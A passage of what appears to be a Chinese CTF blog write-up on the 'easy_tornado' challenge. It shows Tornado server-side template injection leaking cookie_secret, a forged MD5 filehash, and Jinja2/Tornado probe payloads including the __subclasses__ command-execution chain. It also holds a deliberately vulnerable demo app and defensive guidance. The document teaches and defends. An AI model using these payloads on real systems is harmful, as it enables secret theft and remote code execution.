+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;350f3f81-e4ac-451d-8565-8c664f833e94&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完整 URL 如下（把主机换成你当前靶场的地址）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;靶场地址&gt;/file?filename=/fllllllllllllag&amp;filehash=c880229d196658ea79c55e9f93963632</span><br></pre></td></tr></table></figure>
+
+<div class="note success flat"><p><strong>这一步的本质是「伪造签名」。</strong> 服务器用 <code>cookie_secret</code> 给文件名算了一个签名，只有签名对得上才允许读文件。我们通过 SSTI 拿到了 <code>cookie_secret</code>，就能给任意文件名算出合法签名——<strong>密钥泄露 &#x3D; 签名机制失效</strong>。</p>
+</div>
+
+<h2 id="第七步：把整条漏洞链串起来"><a href="#第七步：把整条漏洞链串起来" class="headerlink" title="第七步：把整条漏洞链串起来"></a>第七步：把整条漏洞链串起来</h2><p>这道题其实是三个「安全措施」被逐个击破：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">① /file 接口限制读文件  ──需要──&gt;  filehash 签名</span><br><span class="line">                                        │</span><br><span class="line">                                        │ 需要 cookie_secret</span><br><span class="line">                                        ▼</span><br><span class="line">② cookie_secret 藏在服务端配置里  ──被──&gt;  SSTI 读出 handler.settings</span><br><span class="line">                                        │</span><br><span class="line">                                        ▼</span><br><span class="line">③ /error?msg= 渲染用户输入   ──导致──&gt;  模板注入</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>设计意图</th>
+<th>实际问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/file</code> 校验 <code>filehash</code></td>
+<td>防止任意文件读取</td>
+<td>签名密钥可以被泄露</td>
+</tr>
+<tr>
+<td><code>cookie_secret</code> 放在 settings</td>
+<td>服务端秘密</td>
+<td>模板上下文能访问 <code>handler.settings</code></td>
+</tr>
+<tr>
+<td><code>/error?msg=</code> 渲染输入</td>
+<td>方便显示错误信息</td>
+<td>用户输入被当成模板代码执行</td>
+</tr>
+</tbody></table>
+<p>任何一环做对，这道题都不成立。最根本的问题是 <strong>③</strong>：用户输入不应该被当作模板。</p>
+<h2 id="补充：Tornado-与-Jinja2-的-SSTI-差异"><a href="#补充：Tornado-与-Jinja2-的-SSTI-差异" class="headerlink" title="补充：Tornado 与 Jinja2 的 SSTI 差异"></a>补充：Tornado 与 Jinja2 的 SSTI 差异</h2><p>虽然都用 <code>&#123;&#123; &#125;&#125;</code>，但两者的对象模型和常用 payload 不一样，做题时别混。</p>
+<h3 id="Tornado-常见探测"><a href="#Tornado-常见探测" class="headerlink" title="Tornado 常见探测"></a>Tornado 常见探测</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                 → 49</span><br><span class="line">&#123;&#123;handler.settings&#125;&#125;    → 应用配置字典</span><br><span class="line">&#123;&#123;handler.application.settings&#125;&#125;</span><br><span class="line">&#123;&#123;handler.request&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Tornado 的模板里可以直接访问 <code>handler</code>、<code>request</code>、<code>current_user</code> 等内置对象。<code>handler.settings</code> 是最经典的配置泄露入口。</p>
+<h3 id="Jinja2-Flask-常见探测"><a href="#Jinja2-Flask-常见探测" class="headerlink" title="Jinja2 &#x2F; Flask 常见探测"></a>Jinja2 &#x2F; Flask 常见探测</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                 → 49</span><br><span class="line">&#123;&#123;config&#125;&#125;              → Flask 配置（可能含 SECRET_KEY）</span><br><span class="line">&#123;&#123;self&#125;&#125;                → 模板自身对象</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125; → 沿 Python 对象模型向上找</span><br></pre></td></tr></table></figure>
+
+<p>Jinja2 更常见的是通过 Python 对象链找 <code>os</code>&#x2F;<code>subprocess</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后从返回的类列表里找可执行命令的类（不同环境索引不同）。这类 payload 只应在<strong>授权靶场</strong>里练习。</p>
+<h3 id="一张对照表"><a href="#一张对照表" class="headerlink" title="一张对照表"></a>一张对照表</h3><table>
+<thead>
+<tr>
+<th>目标</th>
+<th>Tornado</th>
+<th>Jinja2&#x2F;Flask</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>算术探测</td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>读配置</td>
+<td><code>&#123;&#123;handler.settings&#125;&#125;</code></td>
+<td><code>&#123;&#123;config&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>读环境变量</td>
+<td>通过 <code>handler.settings</code> &#x2F; Python 对象链</td>
+<td><code>&#123;&#123;config&#125;&#125;</code> &#x2F; <code>&#123;&#123;cycler.__init__.__globals__&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>Python 对象链</td>
+<td>Python 对象链</td>
+</tr>
+</tbody></table>
+<div class="note warning flat"><p><strong>SSTI 的攻击面远不止读配置。</strong> 在真实环境中，模板注入往往能进一步升级为命令执行。本文所有 payload 仅用于理解原理和授权靶场练习；不要对未授权系统使用。</p>
+</div>
+
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><details class="note nx-note info">
+<summary><p><strong>Q1：为什么算术探测 <code>7*7</code> 返回 <code>ORZ</code>，不是 <code>49</code>？</strong></p>
+</summary>
+<div class="nx-note__body"><p>说明 <code>msg</code> 确实被模板渲染了，但 <code>7*7</code> 这种明显的探测特征被 WAF&#x2F;黑名单拦下。换 <code>{{7+7}}</code>、<code>{{7**7}}</code> 或直接试 <code>{{handler.settings}}</code>，有时能绕过基于关键词的过滤。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q2：<code>handler</code> 为什么能在模板里直接用？</strong></p>
+</summary>
+<div class="nx-note__body"><p>Tornado 渲染模板时会把当前 <code>RequestHandler</code> 放进上下文。<code>handler.settings</code> 就是应用的配置字典。这不是 bug，而是框架提供的便利；但当模板能渲染用户输入时，这个便利就变成了信息泄露渠道。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q3：<code>cookie_secret</code> 是 Cookie 吗？需要我改 Cookie 头吗？</strong></p>
+</summary>
+<div class="nx-note__body"><p>不是。<code>cookie_secret</code> 只是 Tornado 配置里的一个密钥名称，本题拿它当 <code>filehash</code> 的签名密钥。你要改的是 URL 里的 <code>filehash</code> 参数，不需要动 Cookie 头。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q4：为什么是 <code>md5(cookie_secret+md5(filename))</code>，不是反过来的？</strong></p>
+</summary>
+<div class="nx-note__body"><p>这是题目&#x2F;服务端约定的顺序。签名算法对顺序敏感，<code>md5(secret + inner)</code> 和 <code>md5(inner + secret)</code> 结果完全不同。以 hints.txt 给的公式为准。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q5：为什么算出来的 hash 和服务端不一致？</strong></p>
+</summary>
+<div class="nx-note__body"><p>最常见的原因是<strong>多了换行或空格</strong>。用 <code>echo</code> 会带 <code>\n</code>；手动复制文件名可能多&#x2F;少一个 <code>l</code>。用 Python 的 <code>hashlib</code> 最稳，并且把中间结果打印出来逐段核对。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q6：<code>/fllllllllllllag</code> 到底有几个 <code>l</code>？</strong></p>
+</summary>
+<div class="nx-note__body"><p>不要手数，直接从 <code>/flag.txt</code> 的响应里复制。差一个字符，<code>md5(filename)</code> 就完全不同。本文的字符串与靶场一致，算出的第一层哈希是 <code>3bf9f6cf685a6dd8defadabfb41a03a1</code>，可以用它反查自己有没有抄错。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q7：<code>handler.settings</code> 在别的 Tornado 版本里也能用吗？</strong></p>
+</summary>
+<div class="nx-note__body"><p>大多数 Tornado 版本都支持。若不行，试 <code>{{handler.application.settings}}</code> 或 <code>{{handler.settings[&#39;cookie_secret&#39;]}}</code>。不同版本的模板上下文可能略有差异。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q8：URL 里的花括号需要编码吗？</strong></p>
+</summary>
+<div class="nx-note__body"><p>浏览器通常会自动处理；用 <code>curl</code> 时建议加引号：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://&lt;靶场&gt;/error?msg=&#123;&#123;handler.settings&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果服务端对特殊字符敏感，可以编码成 <code>%7B%7Bhandler.settings%7D%7D</code>。</p>
+</div>
+</details>
+
+<details class="note nx-note info">
+<summary><p><strong>Q9：为什么 flag 文件叫 <code>/fllllllllllllag</code>，不是 <code>/flag</code>？</strong></p>
+</summary>
+<div class="nx-note__body"><p>出题人故意用一长串 <code>l</code> 防止你直接猜路径，同时让 <code>filename</code> 参与哈希。路径本身不是秘密，秘密是签名密钥。</p>
+</div>
+</details>
+
+<h2 id="工具速查卡"><a href="#工具速查卡" class="headerlink" title="工具速查卡"></a>工具速查卡</h2><table>
+<thead>
+<tr>
+<th>工具&#x2F;操作</th>
+<th>用途</th>
+<th>关键点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>浏览器 &#x2F; <code>curl</code></td>
+<td>发请求、看回显</td>
+<td><code>&#123;&#123;handler.settings&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Python <code>hashlib</code></td>
+<td>算 MD5</td>
+<td>用 <code>.encode()</code>，避免换行</td>
+</tr>
+<tr>
+<td><code>printf &#39;%s&#39; | md5sum</code></td>
+<td>命令行算 MD5</td>
+<td>别用 <code>echo</code></td>
+</tr>
+<tr>
+<td>CyberChef</td>
+<td>图形化哈希&#x2F;编码</td>
+<td><code>MD5</code> 操作可串联</td>
+</tr>
+<tr>
+<td><code>Ctrl+U</code> &#x2F; F12</td>
+<td>看源码和请求</td>
+<td>找参数、找回显</td>
+</tr>
+<tr>
+<td>URL 编码</td>
+<td>处理 <code>&#123;</code> <code>&#125;</code></td>
+<td><code>%7B%7B</code> &#x2F; <code>%7D%7D</code></td>
+</tr>
+</tbody></table>
+<h2 id="本地复现（选做）"><a href="#本地复现（选做）" class="headerlink" title="本地复现（选做）"></a>本地复现（选做）</h2><p>想真正理解签名逻辑，可以用 Tornado 搭一个最小版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line">COOKIE_SECRET = <span class="string">&quot;11eaad43-3efb-4d73-a1a3-94282cdacebd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        msg = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.write(<span class="variable language_">self</span>.render_string(msg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        filename = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        filehash = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;filehash&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        inner = hashlib.md5(filename.encode()).hexdigest()</span><br><span class="line">        expect = hashlib.md5((COOKIE_SECRET + inner).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> filehash != expect:</span><br><span class="line">            <span class="variable language_">self</span>.write(<span class="string">&quot;bad filehash&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="variable language_">self</span>.write(filename + <span class="string">&quot;\nCTF2&#123;local_test_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_app</span>():</span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">        (<span class="string">r&quot;/error&quot;</span>, ErrorHandler),</span><br><span class="line">        (<span class="string">r&quot;/file&quot;</span>, FileHandler),</span><br><span class="line">    ], cookie_secret=COOKIE_SECRET)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    make_app().listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>
+
+<p>启动后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8000/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">http://127.0.0.1:8000/file?filename=/fllllllllllllag&amp;filehash=&lt;算出来的值&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就能完整复现「SSTI 泄露密钥 → 伪造签名 → 读文件」这条链。</p>
+<div class="note info flat"><p>注意：上面的 <code>render_string(msg)</code> 把用户输入<strong>直接当成模板</strong>，所以 <code>{{handler.settings}}</code> 会被执行，这是漏洞版本。安全写法是 <code>render_string(&quot;{{ msg }}&quot;, msg=msg)</code>，把 <code>msg</code> 作为数据传入模板。自己搭实验时可以把两种写法都跑一遍，对比回显差异。</p>
+</div>
+
+<h2 id="顺手聊聊：SSTI-与签名机制的现实风险"><a href="#顺手聊聊：SSTI-与签名机制的现实风险" class="headerlink" title="顺手聊聊：SSTI 与签名机制的现实风险"></a>顺手聊聊：SSTI 与签名机制的现实风险</h2><h3 id="SSTI-为什么危险"><a href="#SSTI-为什么危险" class="headerlink" title="SSTI 为什么危险"></a>SSTI 为什么危险</h3><p>模板引擎通常能访问语言的完整对象模型。一旦用户输入被当成模板执行，攻击者可能：</p>
+<ul>
+<li>读取应用配置、环境变量、密钥；</li>
+<li>读取服务器文件；</li>
+<li>通过 Python 对象链调用系统命令；</li>
+<li>进一步横向移动到数据库、内网。</li>
+</ul>
+<p>防护原则：</p>
+<table>
+<thead>
+<tr>
+<th>风险</th>
+<th>防护</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户输入进模板</td>
+<td>用户输入只作为<strong>数据</strong>传入，绝不拼接进模板字符串</td>
+</tr>
+<tr>
+<td>模板能访问敏感对象</td>
+<td>使用沙箱模板；限制上下文变量</td>
+</tr>
+<tr>
+<td>错误信息回显输入</td>
+<td>错误页固定文案，不回显原始输入</td>
+</tr>
+<tr>
+<td>调试模式上线</td>
+<td>生产环境关闭 <code>debug</code>、<code>autoreload</code></td>
+</tr>
+<tr>
+<td>配置含密钥</td>
+<td>密钥放环境变量&#x2F;密钥管理服务，模板上下文不暴露</td>
+</tr>
+</tbody></table>
+<h3 id="签名机制怎么设计才稳"><a href="#签名机制怎么设计才稳" class="headerlink" title="签名机制怎么设计才稳"></a>签名机制怎么设计才稳</h3><p>这道题的签名思路（<code>md5(secret + md5(data))</code>）在现实中很常见，但有几点要注意：</p>
+<table>
+<thead>
+<tr>
+<th>设计点</th>
+<th>本题做法</th>
+<th>更稳妥的做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>哈希算法</td>
+<td>MD5</td>
+<td>HMAC-SHA256</td>
+</tr>
+<tr>
+<td>拼接方式</td>
+<td>字符串直接拼接</td>
+<td>用 HMAC，避免长度扩展问题</td>
+</tr>
+<tr>
+<td>密钥管理</td>
+<td>放在 <code>settings</code> 里</td>
+<td>密钥管理服务，最小权限</td>
+</tr>
+<tr>
+<td>比较方式</td>
+<td><code>!=</code></td>
+<td>常量时间比较（防时序攻击）</td>
+</tr>
+<tr>
+<td>有效期</td>
+<td>无</td>
+<td>加过期时间、绑定用户&#x2F;路径</td>
+</tr>
+</tbody></table>
+<div class="note success flat"><p><strong>一条经验</strong>：签名机制的安全性完全取决于密钥。密钥一旦通过 SSTI、日志、错误页、源码泄露等渠道暴露，签名就形同虚设。做 Web 题时，看到「hash + secret」的组合，先找 secret 的泄露点；做防御时，先想密钥会不会被模板、日志、报错带出去。</p>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Quellisya">Quellisya</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quellisya.github.io/2026/11/01/web-ctf-easy-tornado/">https://quellisya.github.io/2026/11/01/web-ctf-easy-tornado/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Quellisya.github.io" target="_blank">Quellisya's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a><a class="post-meta__tags" href="/tags/Tornado/">Tornado</a><a class="post-meta__tags" href="/tags/handler-settings/">handler.settings</a><a class="post-meta__tags" href="/tags/cookie-secret/">cookie_secret</a><a class="post-meta__tags" href="/tags/MD5/">MD5</a><a class="post-meta__tags" href="/tags/CTF2/">CTF2</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-seal.svg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/11/01/misc-wireshark-password/" title="[JBCTF] wireshark：从 HTTP 登录表单里找出 password"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[JBCTF] wireshark：从 HTTP 登录表单里找出 password</div></div><div class="info-2"><div class="info-item-1">题目要求找 password。pcap 里混着 DNS 和 TCP，但真正的线索是第 20 号包：一个发往登录接口的 HTTP POST，请求体是 application/x-www-form-urlencoded，password 字段的值就是 flag 的内容。</div></div></div></a><a class="pagination-related" href="/2026/11/01/web-ctf-backupfile/" title="[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较</div></div><div class="info-2"><div class="info-item-1">首页只有一句“Try to find out source file!”。dirsearch 扫出 index.php.bak，下载后看到 is_numeric + intval + 两个等号的弱比较，传 key=123 即可让“123”和“123ffws...”判等。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/11/01/web-ctf-backupfile/" title="[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-01</div><div class="info-item-2">[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较</div></div><div class="info-2"><div class="info-item-1">首页只有一句“Try to find out source file!”。dirsearch 扫出 index.php.bak，下载后看到 is_numeric + intval + 两个等号的弱比较，传 key=123 即可让“123”和“123ffws...”判等。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-seal.svg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Quellisya</div><div class="author-info-description">记录 CTF 与 Web 安全的学习笔记，把每一步讲清楚。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Quellisya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Quellisya" target="_blank" title="Github"><i class="fab fa-github" style="color: #0f2f32;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">循墨迹读代码，借微光见漏洞。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%8A%8A%E9%A6%96%E9%A1%B5%E7%9A%84%E4%B8%89%E4%B8%AA%E6%96%87%E4%BB%B6%E9%83%BD%E8%AF%BB%E4%B8%80%E9%81%8D"><span class="toc-text">第一步：把首页的三个文件都读一遍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AF-SSTI"><span class="toc-text">第二步：什么是 SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">第三步：找注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A-handler-settings-%E6%B3%84%E9%9C%B2-cookie-secret"><span class="toc-text">第四步：{{handler.settings}} 泄露 cookie_secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%8C%89%E5%85%AC%E5%BC%8F%E7%AE%97-filehash"><span class="toc-text">第五步：按公式算 filehash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9Amd5-filename"><span class="toc-text">5.1 第一层：md5(filename)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9Amd5-cookie-secret-%E7%AC%AC%E4%B8%80%E5%B1%82%E7%BB%93%E6%9E%9C"><span class="toc-text">5.2 第二层：md5(cookie_secret + 第一层结果)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E7%94%A8-Python-%E7%AE%97"><span class="toc-text">5.3 用 Python 算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AE%97"><span class="toc-text">5.4 用命令行算</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-file-%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%8B%BF-flag"><span class="toc-text">第六步：构造 &#x2F;file 请求，拿 flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%8A%8A%E6%95%B4%E6%9D%A1%E6%BC%8F%E6%B4%9E%E9%93%BE%E4%B8%B2%E8%B5%B7%E6%9D%A5"><span class="toc-text">第七步：把整条漏洞链串起来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9ATornado-%E4%B8%8E-Jinja2-%E7%9A%84-SSTI-%E5%B7%AE%E5%BC%82"><span class="toc-text">补充：Tornado 与 Jinja2 的 SSTI 差异</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado-%E5%B8%B8%E8%A7%81%E6%8E%A2%E6%B5%8B"><span class="toc-text">Tornado 常见探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jinja2-Flask-%E5%B8%B8%E8%A7%81%E6%8E%A2%E6%B5%8B"><span class="toc-text">Jinja2 &#x2F; Flask 常见探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E5%AF%B9%E7%85%A7%E8%A1%A8"><span class="toc-text">一张对照表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">新手常见问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5%E5%8D%A1"><span class="toc-text">工具速查卡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0%EF%BC%88%E9%80%89%E5%81%9A%EF%BC%89"><span class="toc-text">本地复现（选做）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%EF%BC%9ASSTI-%E4%B8%8E%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6%E7%9A%84%E7%8E%B0%E5%AE%9E%E9%A3%8E%E9%99%A9"><span class="toc-text">顺手聊聊：SSTI 与签名机制的现实风险</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8D%B1%E9%99%A9"><span class="toc-text">SSTI 为什么危险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6%E6%80%8E%E4%B9%88%E8%AE%BE%E8%AE%A1%E6%89%8D%E7%A8%B3"><span class="toc-text">签名机制怎么设计才稳</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/misc-wireshark-password/" title="[JBCTF] wireshark：从 HTTP 登录表单里找出 password">[JBCTF] wireshark：从 HTTP 登录表单里找出 password</a><time datetime="2026-11-01T02:20:00.000Z" title="发表于 2026-11-01 10:20:00">2026-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/web-ctf-easy-tornado/" title="[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名">[CTF2] easy_tornado：SSTI、handler.settings 与 filehash 签名</a><time datetime="2026-11-01T02:00:00.000Z" title="发表于 2026-11-01 10:00:00">2026-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/web-ctf-backupfile/" title="[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较">[CTF2] BackupFile：.bak 备份文件泄露与 PHP 弱比较</a><time datetime="2026-11-01T01:40:00.000Z" title="发表于 2026-11-01 09:40:00">2026-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/reverse-reverse1-ida/" title="[BUUCTF] reverse1：在 IDA 里看懂 Str2 的字符替换">[BUUCTF] reverse1：在 IDA 